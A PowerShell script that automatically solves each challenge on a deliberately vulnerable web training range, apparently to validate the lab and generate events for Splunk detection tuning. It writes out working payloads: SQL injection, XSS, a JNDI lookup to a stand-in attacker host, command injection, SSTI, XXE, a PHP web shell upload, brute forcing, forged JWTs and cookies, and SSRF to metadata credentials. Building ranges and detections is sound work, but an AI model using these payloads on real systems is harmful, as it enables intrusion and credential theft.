<#
.SYNOPSIS
    Solves every CTF challenge on the range and reports pass/fail. Windows twin
    of tools/validate_range.sh.

.DESCRIPTION
    Use it to verify an IIS deployment and to generate a complete event set for
    Splunk detection tuning. Exits non-zero if any challenge fails.

.EXAMPLE
    .\tools\Validate-Range.ps1 -BaseUrl http://localhost:8080
#>
param(
    [string]$BaseUrl = "http://localhost:8080",
    [string]$RepositoryPath = (Split-Path -Parent $PSScriptRoot),
    [int]$MetadataPort = 8080,
    [string]$Team = "validation-bot",
    [string]$TestId = "ps-validation"
)

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"
$BaseUrl = $BaseUrl.TrimEnd("/")
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$script:Pass = 0; $script:Fail = 0; $script:Failed = @()

$python = Join-Path $RepositoryPath ".venv\Scripts\python.exe"

function Invoke-Lab {
    <# Returns the response body as a string, including for 4xx/5xx responses. #>
    param(
        [string]$Path,
        [string]$Method = "GET",
        $Body = $null,
        [string]$ContentType = "application/json",
        [hashtable]$Headers = @{}
    )
    $Headers["X-Lab-Test-ID"] = $TestId
    $uri = if ($Path -match '^https?://') { $Path } else { "$BaseUrl$Path" }
    try {
        $arguments = @{
            Uri = $uri; Method = $Method; WebSession = $session
            Headers = $Headers; UseBasicParsing = $true; TimeoutSec = 20
        }
        if ($null -ne $Body) { $arguments.Body = $Body; $arguments.ContentType = $ContentType }
        return (Invoke-WebRequest @arguments).Content
    } catch {
        $response = $_.Exception.Response
        if ($null -ne $response) {
            try {
                $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
                return $reader.ReadToEnd()
            } catch { return "" }
        }
        return ""
    }
}

function Get-Flag { param([string]$Text)
    if ($Text -match 'HELPAG\{[^}]*\}') { return $Matches[0] }
    return ""
}

function Submit-Flag { param([string]$Id, [string]$Flag)
    if ([string]::IsNullOrWhiteSpace($Flag)) {
        Write-Host ("  FAIL {0,-22} no flag recovered" -f $Id) -ForegroundColor Red
        $script:Fail++; $script:Failed += $Id; return
    }
    $body = @{ flag = $Flag } | ConvertTo-Json -Compress
    $result = Invoke-Lab -Path "/api/ctf/submit" -Method POST -Body $body
    if ($result -match '"correct":\s*true') {
        Write-Host ("  PASS {0,-22} {1}" -f $Id, $Flag) -ForegroundColor Green
        $script:Pass++
    } else {
        Write-Host ("  FAIL {0,-22} rejected: {1}" -f $Id, $result) -ForegroundColor Red
        $script:Fail++; $script:Failed += $Id
    }
}

function Get-Md5 { param([string]$Text)
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $bytes = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Text))
    return (($bytes | ForEach-Object { $_.ToString("x2") }) -join "")
}

function ConvertTo-Base64Url { param([string]$Text)
    $raw = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Text))
    return $raw.TrimEnd("=").Replace("+", "-").Replace("/", "_")
}

function Encode { param([string]$Text) return [System.Uri]::EscapeDataString($Text) }

Write-Host "== HELP AG VAPT range validation against $BaseUrl ==" -ForegroundColor Cyan
Invoke-Lab -Path "/api/ctf/team" -Method POST -Body (@{ team = $Team } | ConvertTo-Json -Compress) | Out-Null

Write-Host "-- recon and misconfiguration --"
Invoke-Lab -Path "/robots.txt" | Out-Null
Submit-Flag "recon-robots"      (Get-Flag (Invoke-Lab -Path "/internal/engineering-notes.txt"))
Submit-Flag "misconfig-debug"   (Get-Flag (Invoke-Lab -Path "/api/debug/config"))
Submit-Flag "misconfig-dotenv"  (Get-Flag (Invoke-Lab -Path "/.env"))
Invoke-Lab -Path "/backups/" | Out-Null
Submit-Flag "misconfig-backups" (Get-Flag (Invoke-Lab -Path "/backups/site-config.bak"))

Write-Host "-- access control --"
Submit-Flag "access-idor"       (Get-Flag (Invoke-Lab -Path "/api/users/1337"))
Submit-Flag "access-massassign" (Get-Flag (Invoke-Lab -Path "/api/profile/update" -Method POST `
    -Body '{"email":"a@lab.invalid","role":"admin"}'))

Write-Host "-- injection --"
Submit-Flag "inject-sqli-union" (Get-Flag (Invoke-Lab -Path ("/api/products/search?q=" + `
    (Encode "' UNION SELECT id,label,value FROM flags-- "))))
Submit-Flag "inject-sqli-auth"  (Get-Flag (Invoke-Lab -Path "/api/legacy/login" -Method POST `
    -Body '{"username":"admin''-- ","password":"x"}'))
Submit-Flag "xss-reflected"     (Get-Flag (Invoke-Lab -Path ("/reflect?name=" + `
    (Encode '<script>alert(1)</script>'))))
Invoke-Lab -Path "/guestbook" -Method POST -Body '{"author":"tester","message":"<script>steal()</script>"}' | Out-Null
Submit-Flag "xss-stored"        (Get-Flag (Invoke-Lab -Path "/admin/review"))
Submit-Flag "inject-jndi"       (Get-Flag (Invoke-Lab -Path "/api/legacy/audit" `
    -Headers @{ "X-Audit-Agent" = '${jndi:ldap://attacker.lab.invalid/a}' }))

Write-Host "-- file handling and code execution --"
Submit-Flag "file-traversal"    (Get-Flag (Invoke-Lab -Path ("/api/documents/download?file=" + `
    (Encode "../flagstore/traversal.flag"))))
# cmd.exe chains with & and reads files with type, not ; and cat.
Submit-Flag "rce-cmdi"          (Get-Flag (Invoke-Lab -Path ("/api/diagnostics/ping?host=" + `
    (Encode "127.0.0.1 & type flagstore\cmdi.flag"))))
# open() takes forward slashes on both platforms; a backslash would be eaten by
# Jinja's string parsing, and cmd's `type` rejects forward slashes.
Submit-Flag "rce-ssti"          (Get-Flag (Invoke-Lab -Path ("/api/newsletter/preview?template=" + `
    (Encode "{{ cycler.__init__.__globals__.__builtins__.open('flagstore/ssti.flag').read() }}"))))
$xxePath = (Join-Path $RepositoryPath "flagstore\xxe.flag").Replace("\", "/")
$xxeBody = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///' + $xxePath + '">]><r>&x;</r>'
Submit-Flag "inject-xxe"        (Get-Flag (Invoke-Lab -Path "/api/suppliers/import" -Method POST `
    -Body $xxeBody -ContentType "application/xml"))

$shellPath = Join-Path $env:TEMP "shell.php"
'<?php system($_GET["cmd"]); ?>' | Set-Content -Path $shellPath -Encoding ASCII
$boundary = [Guid]::NewGuid().ToString()
$uploadBody = (
    "--$boundary", 'Content-Disposition: form-data; name="file"; filename="shell.php"',
    "Content-Type: application/octet-stream", "", (Get-Content $shellPath -Raw), "--$boundary--", ""
) -join "`r`n"
Submit-Flag "upload-unrestricted" (Get-Flag (Invoke-Lab -Path "/api/upload" -Method POST `
    -Body $uploadBody -ContentType "multipart/form-data; boundary=$boundary"))

Write-Host "-- authentication --"
$loginResult = ""
foreach ($password in @("123456", "password", "letmein", "qwerty", "summer2024")) {
    $loginResult = Invoke-Lab -Path "/api/login" -Method POST `
        -Body (@{ username = "svc_backup"; password = $password } | ConvertTo-Json -Compress)
}
Submit-Flag "auth-bruteforce"   (Get-Flag $loginResult)

$forgedJwt = (ConvertTo-Base64Url '{"alg":"none","typ":"JWT"}') + "." + `
             (ConvertTo-Base64Url '{"sub":"attacker","role":"admin"}') + "."
Submit-Flag "auth-jwt-none"     (Get-Flag (Invoke-Lab -Path "/api/admin/report" `
    -Headers @{ Authorization = "Bearer $forgedJwt" }))

$resetToken = Get-Md5 "j.ellison"
Invoke-Lab -Path "/api/password-reset/request" -Method POST -Body '{"username":"j.ellison"}' | Out-Null
Submit-Flag "auth-reset-token"  (Get-Flag (Invoke-Lab -Path "/api/password-reset/consume" -Method POST `
    -Body (@{ username = "j.ellison"; token = $resetToken } | ConvertTo-Json -Compress)))

if (Test-Path $python) {
    $secret = if ($env:LAB_SESSION_SECRET) { $env:LAB_SESSION_SECRET } else { "deliberately-weak-lab-secret" }
    $forgedCookie = & $python (Join-Path $RepositoryPath "tools\forge_session.py") --secret $secret
    Submit-Flag "auth-weak-secret" (Get-Flag (Invoke-Lab -Path "/admin/panel" `
        -Headers @{ Cookie = "session=$forgedCookie" }))
} else {
    Write-Host "  SKIP auth-weak-secret       .venv not found at $python" -ForegroundColor Yellow
    $script:Fail++; $script:Failed += "auth-weak-secret"
}

Write-Host "-- ssrf and business logic --"
$metadataUrl = "http://127.0.0.1:$MetadataPort/latest/meta-data/iam/security-credentials/lab-instance-role"
Submit-Flag "ssrf-metadata"     (Get-Flag (Invoke-Lab -Path ("/api/fetch?url=" + (Encode $metadataUrl))))
Submit-Flag "logic-negative"    (Get-Flag (Invoke-Lab -Path "/api/checkout" -Method POST `
    -Body '{"quantity":-5,"unit_price":900}'))

Write-Host ""
Write-Host "== $script:Pass passed, $script:Fail failed ==" -ForegroundColor Cyan
if ($script:Fail -gt 0) {
    Write-Host ("failed: " + ($script:Failed -join ", ")) -ForegroundColor Red
    exit 1
}
exit 0
